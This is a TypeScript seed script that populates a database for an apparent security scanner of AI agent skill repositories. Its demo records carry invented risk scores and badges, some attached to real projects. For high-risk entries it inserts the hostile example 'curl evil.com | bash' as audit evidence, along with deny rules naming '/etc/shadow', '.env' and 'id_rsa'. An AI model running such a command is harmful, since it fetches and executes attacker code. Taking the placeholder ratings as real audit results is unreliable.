import dotenv from "dotenv";
dotenv.config({ path: ".env.local" });

const DEMO_SKILLS = [
    // --- Coding Agents & IDEs ---
    {
        owner: "anthropics",
        repo: "skills",
        category: "Coding Agents & IDEs",
        risk: "low",
        score: 5,
        badge: "diamond",
        desc: "Official Anthropic skills repository - Document manipulation, Brand Guidelines."
    },
    {
        owner: "sickn33",
        repo: "antigravity-awesome-skills",
        category: "Coding Agents & IDEs",
        risk: "low",
        score: 2,
        badge: "obsidian",
        desc: "The Ultimate Collection of 713+ Universal Agentic Skills for AI Coding Assistants."
    },
    {
        owner: "cursor-ai",
        repo: "cursor-skills",
        category: "Coding Agents & IDEs",
        risk: "medium",
        score: 45,
        badge: "bronze",
        desc: "Community skills for Cursor IDE."
    },

    // --- DevOps & Cloud ---
    {
        owner: "vercel-labs",
        repo: "agent-skills",
        category: "DevOps & Cloud",
        risk: "low",
        score: 10,
        badge: "gold",
        desc: "Vercel Labs official skills - React Best Practices, Web Design Guidelines."
    },
    {
        owner: "aws-samples",
        repo: "aws-cdk-examples",
        category: "DevOps & Cloud",
        risk: "low",
        score: 15,
        badge: "silver",
        desc: "Example projects for the AWS Cloud Development Kit (AWS CDK)."
    },
    {
        owner: "docker",
        repo: "labs-ai-tools-for-devs",
        category: "DevOps & Cloud",
        risk: "low",
        score: 12,
        badge: "silver",
        desc: "Docker's AI tools for developers."
    },

    // --- Security & Passwords ---
    {
        owner: "OWASP",
        repo: "CheatSheetSeries",
        category: "Security & Passwords",
        risk: "low",
        score: 5,
        badge: "platinum",
        desc: "The OWASP Cheat Sheet Series - concise security information."
    },
    {
        owner: "zaproxy",
        repo: "zaproxy",
        category: "Security & Passwords",
        risk: "medium",
        score: 40,
        badge: "bronze",
        desc: "The OWASP ZAP core project."
    },
    {
        owner: "evil-agent-org",
        repo: "data-exfiltrator",
        category: "Security & Passwords",
        risk: "high",
        score: 95,
        badge: "paper",
        desc: "A suspicious agent that pipes shell output to external servers."
    },

    // --- AI & LLMs ---
    {
        owner: "langchain-ai",
        repo: "langchain",
        category: "AI & LLMs",
        risk: "low",
        score: 10,
        badge: "gold",
        desc: "Building applications with LLMs through composability."
    },
    {
        owner: "run-llama",
        repo: "llama_index",
        category: "AI & LLMs",
        risk: "low",
        score: 12,
        badge: "silver",
        desc: "Data framework for your LLM applications."
    },
    {
        owner: "microsoft",
        repo: "autogen",
        category: "AI & LLMs",
        risk: "medium",
        score: 45,
        badge: "bronze",
        desc: "A framework that enables the development of LLM applications using multiple agents."
    },
    {
        owner: "openai",
        repo: "swarm",
        category: "AI & LLMs",
        risk: "low",
        score: 15,
        badge: "silver",
        desc: "Educational framework exploring ergonomic, lightweight multi-agent orchestration."
    },
    {
        owner: "yoheinakajima",
        repo: "babyagi",
        category: "AI & LLMs",
        risk: "high",
        score: 95,
        badge: "paper",
        desc: "AI-powered task management system."
    },
    {
        owner: "Significant-Gravitas",
        repo: "AutoGPT",
        category: "AI & LLMs",
        risk: "medium",
        score: 55,
        badge: "iron",
        desc: "AutoGPT is the vision of accessible AI for everyone."
    },

    // --- Web & Frontend Development ---
    {
        owner: "shadcn-ui",
        repo: "ui",
        category: "Web & Frontend Development",
        risk: "low",
        score: 5,
        badge: "obsidian",
        desc: "Beautifully designed components that you can copy and paste into your apps."
    },
    {
        owner: "tailwindlabs",
        repo: "tailwindcss",
        category: "Web & Frontend Development",
        risk: "low",
        score: 8,
        badge: "diamond",
        desc: "A utility-first CSS framework for rapid UI development."
    },
    {
        owner: "remotion-dev",
        repo: "skills",
        category: "Web & Frontend Development",
        risk: "low",
        score: 10,
        badge: "gold",
        desc: "Official Remotion skills - Video creation in React."
    },

    // --- Productivity & Tasks ---
    {
        owner: "antigravity-official",
        repo: "workflow-automation",
        category: "Productivity & Tasks",
        risk: "low",
        score: 5,
        badge: "platinum",
        desc: "Automate your daily workflows with intelligent agents."
    },
    {
        owner: "calcom",
        repo: "cal.com",
        category: "Productivity & Tasks",
        risk: "low",
        score: 15,
        badge: "silver",
        desc: "Scheduling infrastructure for everyone."
    },

    // --- Data & Analytics ---
    {
        owner: "supabase",
        repo: "agent-skills",
        category: "Data & Analytics",
        risk: "low",
        score: 5,
        badge: "diamond",
        desc: "Supabase official skills - Postgres Best Practices."
    }
];

async function seed() {
    console.log("🌱 Seeding database...");

    // Dynamic import to ensure dotenv loads first
    const { supabaseAdmin } = await import("./lib/supabase");

    for (const item of DEMO_SKILLS) {
        const slug = `${item.owner}/${item.repo}`.toLowerCase();

        // 1. Create Skill
        const { data: skill, error: skillError } = await (supabaseAdmin
            .from("skills") as any)
            .upsert({
                name: item.repo,
                slug: slug,
                source_url: `https://github.com/${item.owner}/${item.repo}`,
                source_type: "github",
                category: item.category
            }, { onConflict: "slug" })
            .select()
            .single();

        if (skillError) {
            console.error(`Error creating skill ${slug}:`, skillError.message);
            continue;
        }

        // 2. Create Scan
        const { error: scanError } = await (supabaseAdmin
            .from("scans") as any)
            .insert({
                skill_id: skill.id,
                status: "done",
                risk_level: item.risk,
                verified_badge: item.badge,
                static_json: {
                    static_score: item.score,
                    capabilities: ["network", "filesystem"],
                    sensitive_paths: item.risk === "high" || item.risk === "critical" ? [".env", "id_rsa"] : []
                },
                deep_json: {
                    summary: `Automated audit for ${item.repo}. ${item.desc}`,
                    risk_level: item.risk,
                    findings: (item.risk === "high" || item.risk === "critical") ? [
                        {
                            title: "Critical: Shell Pipe Detected",
                            severity: "critical",
                            why_it_matters: "Piping curl to bash is extremely dangerous.",
                            evidence: [{ snippet: "curl evil.com | bash", source: "install.sh" }],
                            recommended_fix: "Remove this line."
                        }
                    ] : [],
                    attack_chain: [],
                    verification_plan: {
                        preflight_checks: ["Check env vars"],
                        runtime_checks: ["Monitor network"],
                        postrun_checks: ["Verify logs"]
                    },
                    policy_suggestions: {
                        allow_domains: ["github.com"],
                        deny_paths: ["/etc/shadow"],
                        tool_restrictions: []
                    },
                    token_usage: {
                        prompt: 15000,
                        response: 4000,
                        total: 19000
                    }
                }
            });

        if (scanError) {
            console.error(`Error creating scan for ${slug}:`, scanError.message);
        } else {
            console.log(`✅ Seeded ${slug} [${item.category}]`);
        }
    }
}

seed();
